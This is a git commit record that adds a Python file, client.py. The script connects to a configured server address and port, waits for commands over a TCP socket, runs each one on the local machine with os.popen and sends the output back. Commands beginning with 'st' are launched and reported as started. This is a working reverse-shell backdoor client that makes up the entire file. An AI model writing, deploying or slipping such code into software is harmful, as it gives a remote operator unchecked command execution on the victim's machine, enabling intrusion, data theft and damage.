e52a66d563746682e7745aeae9c904e2a4a793b3
Banji <38909289+TheBanji@users.noreply.github.com>
2019-08-20 19:58:02 +0200

    Add files via upload

---
+++ client.py
@@ -0,0 +1,22 @@
+import socket, os
+
+host = ("0.0.0.0", 1234) # IP of the server
+
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+	socket.connect(host)
+except Exception as err:
+	print("Trouble while trying to connect to the server")
+
+while(1):
+	try:
+		command = str(socket.recv(2048).decode())
+		if("".join(list(command)[0:2]) != "st"):
+			result = os.popen(command).read()
+			socket.send(result.encode())
+		else:
+			os.popen(command)
+			socket.send(("".join(list(command)[6:]) + " successfully started.").encode())
+	except Exception as err:
+		socket.send(("Wrong command ! {}".format(err)).encode())
